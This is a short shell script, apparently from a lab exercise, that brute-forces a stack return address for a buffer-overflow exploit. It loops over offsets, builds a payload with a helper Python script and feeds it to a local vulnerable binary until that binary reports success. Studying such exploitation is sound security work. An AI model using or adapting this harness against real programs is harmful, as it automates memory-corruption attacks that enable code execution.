#!/bin/sh

DEFAULT_BUFFER_SIZE=128
DEFAULT_OFFSET=0
MAX_STEPS=300
i=0

#exec 2> /dev/null

if [ $# -ge 1 ] 
then
	DEFAULT_BUFFER_SIZE=$1
fi
if [ $# -ge 2 ]
then
	DEFAULT_OFFSET=$2
fi

while [ $i -le $MAX_STEPS ]
do
	RET_ADDRESS=$( ./sp_address "$DEFAULT_BUFFER_SIZE" "$(($DEFAULT_OFFSET \+ $i))") 
	python3 payload_builder.py "$RET_ADDRESS"
	./buffer_overflow $( cat payload.bin )
	if [ $? -eq 0 ]
	then
		echo "Payload found succesfully..."
		echo "Correct return address was $RET_ADDRESS"
		exit
	fi
	i=$(( i \+ 1))
done

